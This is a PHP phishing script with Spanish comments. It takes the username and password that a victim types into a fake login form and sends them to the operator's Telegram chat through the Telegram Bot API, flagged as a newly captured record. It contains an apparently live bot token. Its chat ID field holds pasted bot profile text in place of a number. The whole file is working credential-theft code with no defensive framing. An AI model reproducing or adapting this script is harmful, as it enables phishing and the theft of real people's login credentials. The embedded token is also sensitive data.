<?php
// Token de tu bot de Telegram
$token = "8927866147:AAEdyIN_57QvOHAVS1vYRxnIROLx56ylAjA";

// AQUÍ DEBES PONER TU CHAT ID REAL (el número de tu chat de Telegram)
$chat_id = "Id: 8930596240
First: 𝕹𝖎𝖌𝖌𝖆
Lang: es
Registered: Check Date

🧠 Explanations and answers
Free AI → DeepSeek & ChatGPT

🖼 Visualize your ideas
Make Image → NanoBanana";

// Captura los datos que el usuario escribió en el formulario de login
$usuario = $_POST['usuario'] ?? $_POST['username'] ?? 'No ingresado';
$password = $_POST['password'] ?? $_POST['clave'] ?? 'No ingresada';

// Arma el mensaje que llegará a tu Telegram
$mensaje  = "🚨 *¡Nuevo dato capturado!* 🚨\n\n";
$mensaje .= "👤 *Usuario:* " . $usuario . "\n";
$mensaje .= "🔑 *Contraseña:* " . $password . "\n";

// URL oficial de la API de Telegram
$url = "https://api.telegram.org/bot{$token}/sendMessage";

// Parámetros que se enviarán
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
];

// Opciones de la petición HTTP
$options = [
    'http' => [
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context  = stream_context_create($options);
$result = @file_get_contents($url, false, $context);
?>